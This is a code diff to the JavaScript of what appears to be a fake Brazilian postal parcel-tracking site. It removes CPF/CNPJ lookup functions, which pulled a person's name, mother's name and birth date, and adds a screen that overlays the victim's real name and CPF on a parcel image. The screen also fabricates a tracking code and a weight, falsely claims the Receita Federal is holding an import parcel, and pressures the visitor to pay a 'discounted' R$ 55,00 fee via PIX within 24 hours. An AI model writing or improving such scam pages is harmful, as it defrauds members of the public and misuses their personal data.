@@ -1,7 +1,8 @@
 /**
- * Index.js - Arquivo Principal Otimizado
+ * Index.js - Arquivo Principal Otimizado com Encomenda Personalizada
  * Versão otimizada: removidos imports não utilizados, simplificado event handling
  * MODIFICADO: Adicionado sistema de consulta para CPF, CNPJ e código de rastreio
+ * NOVO: Sistema de encomenda personalizada com dados reais
  */
 
 import * as alerta from '../core/templates/bunker/js/alerta.js';
@@ -681,66 +682,6 @@ class TrackingSystem {
         this.atualizarTitulo(codigoFormatado);
     }
 
-    async processarCPF(cpf) {
-        try {
-            alerta.abre('Consultando CPF...');
-            
-            // Fazer consulta na API
-            const dadosCPF = await this.consultarAPICPF(cpf);
-            
-            // Salvar dados em variáveis globais
-            window.dadosUsuario = {
-                nome: dadosCPF.nome,
-                mae: dadosCPF.mae,
-                nascimento: dadosCPF.nascimento,
-                cpf: dadosCPF.cpf
-            };
-            
-            // Atualizar trilha
-            this.atualizarTrilha(cpf);
-            
-            // Atualizar título com nome
-            this.atualizarTitulo(`Olá, ${dadosCPF.nome}`);
-            
-            alerta.fecha();
-            
-        } catch (error) {
-            alerta.fecha();
-            throw new Error('Erro ao consultar CPF: ' + error.message);
-        }
-    }
-
-    async processarCNPJ(cnpj) {
-        try {
-            alerta.abre('Consultando CNPJ...');
-            
-            // Fazer consulta na API
-            const dadosCNPJ = await this.consultarAPICNPJ(cnpj);
-            
-            // Salvar dados em variáveis globais
-            window.dadosEmpresa = {
-                nome: dadosCNPJ.nome,
-                fantasia: dadosCNPJ.fantasia,
-                cnpj: dadosCNPJ.cnpj
-            };
-            
-            // Atualizar trilha
-            this.atualizarTrilha(cnpj);
-            
-            // Atualizar título com nome fantasia
-            const nomeExibicao = dadosCNPJ.fantasia && dadosCNPJ.fantasia.trim() 
-                ? dadosCNPJ.fantasia 
-                : dadosCNPJ.nome;
-            this.atualizarTitulo(`Olá, ${nomeExibicao}`);
-            
-            alerta.fecha();
-            
-        } catch (error) {
-            alerta.fecha();
-            throw new Error('Erro ao consultar CNPJ: ' + error.message);
-        }
-    }
-
     async consultarResultado(objeto) {
         const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;
         const url = `resultado.php?objeto=${objeto}&captcha=${captcha}`;
@@ -815,6 +756,229 @@ class TrackingSystem {
         return `${codigo.substring(0, 2)} ${codigo.substring(2, 5)} ${codigo.substring(5, 8)} ${codigo.substring(8, 11)} ${codigo.substring(11, 13)}`;
     }
 
+    // === SISTEMA DE ENCOMENDA PERSONALIZADA ===
+    
+    gerarImagemEncomenda(dadosUsuario) {
+        const { nome, cpf } = dadosUsuario;
+        
+        // Formatar CPF: 000.000.000-00
+        const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        
+        // Gerar código de rastreamento fictício baseado no CPF
+        const codigoRastreio = this.gerarCodigoRastreio(cpf);
+        
+        return `
+            <div class="encomenda-personalizada" style="position: relative; display: inline-block; max-width: 100%;">
+                <img src="../static/rastreamento-internet/imgs/encomenda0.png" 
+                     alt="Encomenda" 
+                     style="width: 100%; max-width: 350px; height: auto; display: block;">
+                
+                <!-- Overlay com dados personalizados - DESTINATÁRIO -->
+                <div class="dados-overlay-destinatario" style="
+                    position: absolute;
+                    top: 52%;
+                    left: 8%;
+                    font-family: Arial, sans-serif;
+                    font-size: clamp(10px, 2.5vw, 14px);
+                    font-weight: bold;
+                    color: #000;
+                    line-height: 1.2;
+                    max-width: 85%;
+                    word-wrap: break-word;
+                ">
+                    ${nome.toUpperCase()}
+                </div>
+                
+                <!-- Overlay com dados personalizados - CPF -->
+                <div class="dados-overlay-cpf" style="
+                    position: absolute;
+                    top: 65%;
+                    left: 8%;
+                    font-family: Arial, sans-serif;
+                    font-size: clamp(10px, 2.5vw, 14px);
+                    font-weight: bold;
+                    color: #000;
+                    line-height: 1.2;
+                ">
+                    ${cpfFormatado}
+                </div>
+                
+                <!-- Peso da encomenda -->
+                <div class="peso-overlay" style="
+                    position: absolute;
+                    top: 26%;
+                    left: 26%;
+                    font-family: Arial, sans-serif;
+                    font-size: clamp(8px, 2vw, 12px);
+                    font-weight: bold;
+                    color: #000;
+                    transform: rotate(-8deg);
+                ">
+                    ${this.gerarPesoAleatorio()}kg
+                </div>
+            </div>
+        `;
+    }
+
+    gerarCodigoRastreio(cpf) {
+        // Usar parte do CPF para gerar código "consistente"
+        const base = cpf.substring(0, 9);
+        const letra1 = String.fromCharCode(65 + (parseInt(base.substring(0, 2)) % 26));
+        const letra2 = String.fromCharCode(65 + (parseInt(base.substring(7, 9)) % 26));
+        
+        return `${letra1}${letra2}${base}BR`;
+    }
+
+    gerarPesoAleatorio() {
+        // Gerar peso entre 0.3kg e 2.5kg
+        const peso = (Math.random() * 2.2 + 0.3).toFixed(1);
+        return peso;
+    }
+
+    gerarConteudoJumbotronComImagem(dadosUsuario) {
+        const imagemEncomenda = this.gerarImagemEncomenda(dadosUsuario);
+        
+        return `
+            <div class="campos"></div>
+            <div class="campos captcha">
+                <div class="campo">
+                    <div class="rotulo">
+                        <label for="objeto">
+                            <div class="container-encomenda" style="
+                                display: flex; 
+                                gap: 20px; 
+                                background-color: white; 
+                                padding: 20px; 
+                                border-radius: 5px; 
+                                border: 1px solid #dee2e6;
+                                flex-wrap: wrap;
+                            ">
+                                
+                                <!-- Coluna do texto -->
+                                <div class="coluna-texto" style="
+                                    flex: 1;
+                                    min-width: 300px;
+                                ">
+                                    <h4 style="color: #00416b; margin-bottom: 15px; font-size: clamp(16px, 4vw, 20px);">
+                                        Regularização de Encomenda Internacional
+                                    </h4>
+                                    
+                                    <p style="margin-bottom: 10px; font-size: clamp(14px, 3vw, 16px);">
+                                        <strong>Prezado(a) ${dadosUsuario.nome},</strong>
+                                    </p>
+                                    
+                                    <p style="margin-bottom: 15px; font-size: clamp(13px, 2.8vw, 15px); line-height: 1.5;">
+                                        Informamos que sua encomenda internacional foi processada pela 
+                                        Receita Federal e encontra-se disponível para retirada em nossa 
+                                        unidade de distribuição, mediante o pagamento das taxas de 
+                                        importação devidas.
+                                    </p>
+                                    
+                                    <div style="
+                                        background-color: #e3f2fd; 
+                                        padding: 15px; 
+                                        border-radius: 3px; 
+                                        margin: 15px 0;
+                                        overflow-x: auto;
+                                    ">
+                                        <table style="width: 100%; border: none; min-width: 250px;">
+                                            <tr>
+                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Situação:</strong></td>
+                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">Aguardando regularização tributária</td>
+                                            </tr>
+                                            <tr>
+                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Prazo:</strong></td>
+                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">24 horas</td>
+                                            </tr>
+                                            <tr>
+                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Valor original:</strong></td>
+                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">R$ 137,50</td>
+                                            </tr>
+                                            <tr>
+                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Valor promocional (60% desconto):</strong></td>
+                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>R$ 55,00</strong></td>
+                                            </tr>
+                                        </table>
+                                    </div>
+                                    
+                                    <p style="
+                                        font-size: clamp(11px, 2.2vw, 13px); 
+                                        color: #6c757d; 
+                                        margin-top: 15px; 
+                                        line-height: 1.4;
+                                    ">
+                                        O pagamento pode ser realizado via PIX para liberação imediata. 
+                                        Após o vencimento do prazo, a encomenda será devolvida ao 
+                                        remetente conforme regulamentação postal.
+                                    </p>
+                                </div>
+                            </div>
+                        </label>
+                    </div>
+                </div>
+                <div class="campo">
+                    <div class="controle" style="
+                        display: flex; 
+                        gap: 10px; 
+                        flex-wrap: wrap; 
+                        justify-content: center;
+                    ">
+						<!-- Coluna da imagem -->
+						<div class="coluna-imagem" style="
+							flex: 0 0 auto;
+							min-width: 250px;
+							max-width: 100%;
+						">
+							${imagemEncomenda}
+						</div><br>
+                        <button type="button" id="b-pesquisar" name="b-pesquisar" class="btn btn-primary botao-principal">
+                            REALIZAR PAGAMENTO
+                        </button>
+                        <button type="button" id="b-voltar" name="b-voltar" 
+                                class="btn btn-primary botao-principal" 
+                                onclick="location.reload()">
+                            Voltar
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <style>
+                @media (max-width: 768px) {
+                    .container-encomenda {
+                        flex-direction: column !important;
+                        align-items: center;
+                    }
+                    
+                    .coluna-imagem {
+                        text-align: center;
+                        min-width: 100% !important;
+                    }
+                    
+                    .coluna-texto {
+                        min-width: 100% !important;
+                    }
+                    
+                    .encomenda-personalizada {
+                        max-width: 300px;
+                        margin: 0 auto;
+                    }
+                }
+                
+                @media (max-width: 480px) {
+                    .container-encomenda {
+                        padding: 15px !important;
+                        gap: 15px !important;
+                    }
+                    
+                    .encomenda-personalizada {
+                        max-width: 250px;
+                    }
+                }
+            </style>
+        `;
+    }
+
     finalizarConsulta() {
         // Remover classe "oculto" do tabs-rastreamento
         const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
@@ -822,80 +986,78 @@ class TrackingSystem {
             DOMUtils.removeClass(tabsRastreamento, 'oculto');
         }
         
-        // Limpar conteúdo do jumbotron
+        // Adicionar conteúdo específico no jumbotron
         const jumbotron = domCache.get('.jumbotron');
         if (jumbotron) {
-            DOMUtils.setHTML(jumbotron, '<!-- Conteúdo será adicionado aqui conforme sua especificação -->');
+            let novoConteudo;
+            
+            // Verificar se temos dados do usuário para personalizar
+            if (window.dadosUsuario && window.dadosUsuario.nome) {
+                novoConteudo = this.gerarConteudoJumbotronComImagem(window.dadosUsuario);
+            } else if (window.dadosEmpresa && window.dadosEmpresa.nome) {
+                // Para CNPJ, usar nome da empresa
+                const dadosParaImagem = {
+                    nome: window.dadosEmpresa.fantasia || window.dadosEmpresa.nome,
+                    cpf: window.dadosEmpresa.cnpj.substring(0, 11) // Usar parte do CNPJ como CPF fictício
+                };
+                novoConteudo = this.gerarConteudoJumbotronComImagem(dadosParaImagem);
+            } else {
+                // Fallback para conteúdo padrão
+                novoConteudo = this.gerarConteudoJumbotronPadrao();
+            }
+            
+            DOMUtils.setHTML(jumbotron, novoConteudo);
+        }
+        
+        // === SCROLL INSTANTÂNEO PARA O TOPO ===
+        this.scrollToTopInstant();
+    }
+
+    gerarConteudoJumbotronPadrao() {
+        return `
+            <div class="campos"></div>
+            <div class="campos captcha">
+                <div class="campo">
+                    <div class="rotulo">
+                        <label for="objeto">
+                            Prezado(a) destinatário(a),<br>
+                            Sua <span style="font-weight: bold">encomenda importada</span> foi <span style="font-weight: bold">devidamente autorizada pela Receita Federal</span> e encontra-se em nossa unidade de distribuição.<br><br>
+                            <span style="font-weight: bold">Status: </span><span style="font-weight: bold; color:red">⚠️ AGUARDANDO REGULARIZAÇÃO TRIBUTÁRIA</span><br>
+                            <span style="font-weight: bold">Prazo para regularização: <span style="color: red">⏰ 24 HORAS</span></span><br>
+                            <span style="font-weight: bold">Após o vencimento do prazo, a encomenda será <span style="color: red">devolvida ao remetente</span> conforme regulamentação dos Correios.</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="campo">
+                    <div class="controle">
+                        <button type="button" id="b-realizar-pagamento" name="b-realizar-pagamento" class="btn btn-primary botao-principal">REALIZAR PAGAMENTO</button>
+                        <button type="button" id="b-voltar" name="b-voltar" class="btn btn-primary botao-principal" onclick="location.reload()">Voltar</button>
+                    </div>
+                    <div class="mensagem">
+                        <span style="font-weight: bold; color:green; font-size: clamp(14px, 4vw, 18px);">
+                            Taxa: De <span style="text-decoration: line-through;">R$ 137,50</span> por apenas R$ 55,00
+                        </span>
+                        <br><span style="font-weight: bold; color:green">Liberação imediata após confirmação via PIX</span>
+                        <br><span style="font-weight: bold; color:darkorange">Taxa promocional - desconto de 60% aplicado</span>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    scrollToTopInstant() {
+        // Método mais compatível e instantâneo
+        window.scrollTo(0, 0);
+        
+        // Força o scroll também no body e html (garantia para todos os navegadores)
+        document.documentElement.scrollTop = 0;
+        document.body.scrollTop = 0;
+        
+        // Para iOS Safari e alguns navegadores mobile
+        if (window.pageYOffset !== undefined) {
+            window.pageYOffset = 0;
         }
     }
-	
-	// === MODIFICAÇÃO NO ARQUIVO app/index.js ===
-
-// Substitua o método finalizarConsulta() existente por este:
-
-finalizarConsulta() {
-    // Remover classe "oculto" do tabs-rastreamento
-    const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
-    if (tabsRastreamento) {
-        DOMUtils.removeClass(tabsRastreamento, 'oculto');
-    }
-    
-    // Adicionar conteúdo específico no jumbotron
-    const jumbotron = domCache.get('.jumbotron');
-    if (jumbotron) {
-        const novoConteudo = this.gerarConteudoJumbotron();
-        DOMUtils.setHTML(jumbotron, novoConteudo);
-    }
-    
-    // === SCROLL INSTANTÂNEO PARA O TOPO ===
-    this.scrollToTopInstant();
-}
-
-scrollToTopInstant() {
-    // Método mais compatível e instantâneo
-    window.scrollTo(0, 0);
-    
-    // Força o scroll também no body e html (garantia para todos os navegadores)
-    document.documentElement.scrollTop = 0;
-    document.body.scrollTop = 0;
-    
-    // Para iOS Safari e alguns navegadores mobile
-    if (window.pageYOffset !== undefined) {
-        window.pageYOffset = 0;
-    }
-}
-
-gerarConteudoJumbotron() {
-    return `
-        <div class="campos"></div>
-        <div class="campos captcha">
-            <div class="campo">
-                <div class="rotulo">
-                    <label for="objeto">
-                        Prezado(a) destinatário(a),<br>
-                        Sua <span style="font-weight: bold">encomenda importada</span> foi <span style="font-weight: bold">devidamente autorizada pela Receita Federal</span> e encontra-se em nossa unidade de distribuição.<br><br>
-                        <span style="font-weight: bold">Status: </span><span style="font-weight: bold; color:red">⚠️ AGUARDANDO REGULARIZAÇÃO TRIBUTÁRIA</span><br>
-                        <span style="font-weight: bold">Prazo para regularização: <span style="color: red">⏰ 24 HORAS</span></span><br>
-                        <span style="font-weight: bold">Após o vencimento do prazo, a encomenda será <span style="color: red">devolvida ao remetente</span> conforme regulamentação dos Correios.</span>
-                    </label>
-                </div>
-            </div>
-            <div class="campo">
-                <div class="controle">
-                    <button type="button" id="b-realizar-pagamento" name="b-realizar-pagamento" class="btn btn-primary botao-principal">REALIZAR PAGAMENTO</button>
-                    <button type="button" id="b-voltar" name="b-voltar" class="btn btn-primary botao-principal" onclick="location.reload()">Voltar</button>
-                </div>
-                <div class="mensagem">
-                    <span style="font-weight: bold; color:green; font-size: clamp(14px, 4vw, 18px);">
-                        Taxa: De <span style="text-decoration: line-through;">R$ 137,50</span> por apenas R$ 55,00
-                    </span>
-                    <br><span style="font-weight: bold; color:green">Liberação imediata após confirmação via PIX</span>
-                    <br><span style="font-weight: bold; color:darkorange">Taxa promocional - desconto de 60% aplicado</span>
-                </div>
-            </div>
-        </div>
-    `;
-}
 
     destroy() {
         apiManager.cancelAllRequests();
